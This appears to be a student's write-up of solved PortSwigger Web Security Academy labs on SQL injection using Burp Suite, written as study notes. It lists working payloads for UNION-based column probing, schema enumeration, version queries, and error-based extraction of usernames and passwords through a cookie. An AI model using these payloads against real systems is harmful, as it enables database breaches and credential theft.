# SQL Injection Labs - Burp Suite

**Platform:** PortSwigger Web Security Academy  
**Tool:** Burp Suite  
**Focus:** SQL Injection  
**Status:** Solved

## Overview

This folder contains my practical SQL Injection labs completed using Burp Suite and PortSwigger Web Security Academy.

The labs focused on understanding SQL injection vulnerabilities, manipulating vulnerable parameters, performing UNION attacks, enumerating databases, retrieving sensitive information, identifying database versions, and exploiting visible database errors.

## SQL Injection

SQL Injection occurs when user-controlled input is inserted into a SQL query without proper handling. By modifying the input, an attacker may be able to change the behavior of the query and access information that should not be accessible.

## UNION Attacks

I practiced using UNION-based SQL injection to interact with the results returned by the application's SQL query.

### Determining the Number of Columns

I used NULL values to determine how many columns were returned by the original query.
```SQL
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
```
### Finding a Column Containing Text

After determining the number of columns, I tested which columns were compatible with text data.
```SQL
    ' UNION SELECT NULL,NULL,NULL--
    ' UNION SELECT 'abcdef',NULL,NULL--
    ' UNION SELECT NULL,'abcdef',NULL--
    ' UNION SELECT NULL,NULL,'abcdef'--
```
### Retrieving Data from Other Tables

After identifying the correct columns, I used UNION SELECT to retrieve information from another table.

    ' UNION SELECT username,password FROM users--

## Database Enumeration

I practiced discovering database tables and columns using database metadata.

### Non-Oracle Databases

    ' UNION SELECT table_name,NULL FROM information_schema.tables--

    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--

### Oracle Databases

Oracle uses different database metadata tables.

    ' UNION SELECT table_name,NULL FROM all_tables--

    ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--

Oracle also requires a FROM clause for SELECT statements, so I used the built-in dual table.

    ' UNION SELECT 'abc','def' FROM dual--

## Database Version

I practiced retrieving database version information using database-specific queries.

### MySQL and Microsoft

    ' UNION SELECT @@version,NULL#

### Oracle

    ' UNION SELECT BANNER,NULL FROM v$version--

## Retrieving Multiple Values

When only one column was compatible with text, I combined multiple database values into a single column.

    ' UNION SELECT NULL,username||'~'||password FROM users--

The username and password were returned together with `~` used as a separator.

## Error-Based SQL Injection

I also practiced SQL injection where the application did not directly display the query results but returned detailed database error messages.

I used the vulnerable `TrackingId` cookie to test the injection.

    TrackingId=ogAZZfxtOKUELbuJ'

I then used SQL comments to make the query syntactically valid.

    TrackingId=ogAZZfxtOKUELbuJ'--

I used `CAST()` to force database values into an error message.

    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

The error message revealed the username `administrator`.

I then modified the query to retrieve the administrator password.

    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

The password was leaked through the database error message and was used to log in as the administrator.

## Key Learning

- SQL Injection can allow attackers to manipulate backend SQL queries.
- UNION attacks can be used to retrieve information from other database tables.
- The number of columns must match when performing a UNION attack.
- Columns must have compatible data types.
- Database metadata can be used to discover tables and columns.
- SQL syntax differs between database technologies.
- Database errors can unintentionally expose sensitive information.
- Burp Suite Repeater is useful for testing and modifying SQL injection payloads.

## Tools Used

- Burp Suite
- Burp Suite Repeater
- PortSwigger Web Security Academy
- SQL

## Conclusion

These labs gave me practical experience with SQL Injection using Burp Suite. I learned how to identify injection points, determine query structure, enumerate database information, retrieve sensitive data, identify database versions, and use database errors to extract information.
```
